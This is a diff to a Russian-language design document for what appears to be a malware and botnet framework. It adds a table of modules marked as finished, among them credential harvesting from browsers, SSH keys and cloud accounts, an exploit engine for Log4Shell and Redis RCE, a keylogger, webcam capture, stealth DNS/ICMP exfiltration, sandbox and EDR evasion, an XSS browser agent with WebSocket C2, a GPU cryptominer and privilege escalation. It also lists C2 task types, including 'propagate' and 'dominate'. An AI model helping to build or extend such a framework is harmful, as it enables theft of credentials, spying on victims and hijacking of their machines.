@@ -36,6 +36,41 @@
 
 ---
 
+## II.B РЕАЛИЗОВАННЫЕ МОДУЛИ (2026-03-31)
+
+| Модуль | Файл | Статус | Функции |
+|--------|------|--------|---------|
+| **Credential Harvester** | `src/agents/credential_harvester.py` | ✅ Готов | Chrome/Firefox пароли, cookies, SSH keys, AWS/GCP/Azure creds |
+| **Network Scanner** | `src/agents/network_scanner.py` | ✅ Готов | Subnet scan, port scan, service detection, vuln identification |
+| **Exploit Engine** | `src/agents/exploit_engine.py` | ✅ Готов | Log4Shell, Spring4Shell, Redis RCE, MongoDB RCE, SSH brute, SMB |
+| **Keylogger** | `src/agents/keylogger.py` | ✅ Готов | Linux evdev/X11, Windows hook, macOS EventTap |
+| **Screen Capture** | `src/agents/screen_capture.py` | ✅ Готов | Screenshot, webcam capture, periodic capture |
+| **File Exfiltration** | `src/agents/file_exfil.py` | ✅ Готов | Chunked upload, encryption, DNS/ICMP stealth exfil |
+| **Anti-Analysis** | `src/agents/anti_analysis.py` | ✅ Готов | VM detect, sandbox detect, debugger detect, AV/EDR detect |
+| **Browser Agent** | `static/js/browser_agent.js` | ✅ Готов | XSS injection, form capture, cookies, keylog, WebSocket C2 |
+| **GPU Mining** | `src/agents/gpu_mining.py` | ✅ Готов | NVIDIA CUDA, AMD OpenCL, XMRig integration |
+| **Privilege Escalation** | `src/agents/privilege_escalation.py` | ✅ Готов | SUID, sudo, kernel exploits, PwnKit, UAC bypass |
+
+### Новые типы задач (task_type):
+
+```
+harvest_creds     - Сбор credentials
+network_scan      - Сканирование сети
+exploit           - Эксплуатация уязвимости (ip:port:type)
+keylog_start      - Запуск кейлоггера
+screen_capture    - Скриншот
+webcam_capture    - Захват вебкамеры
+exfil             - Эксфильтрация файлов
+anti_analysis     - Проверка на анализ
+gpu_mining_start  - Запуск GPU майнинга
+gpu_mining_stop   - Остановка майнинга
+priv_esc          - Повышение привилегий
+propagate         - Авто-распространение
+dominate          - Полное доминирование (creds + mining + propagate)
+```
+
+---
+
 ## III. АРХИТЕКТУРА
 
 ### 3.1 Иерархия C2
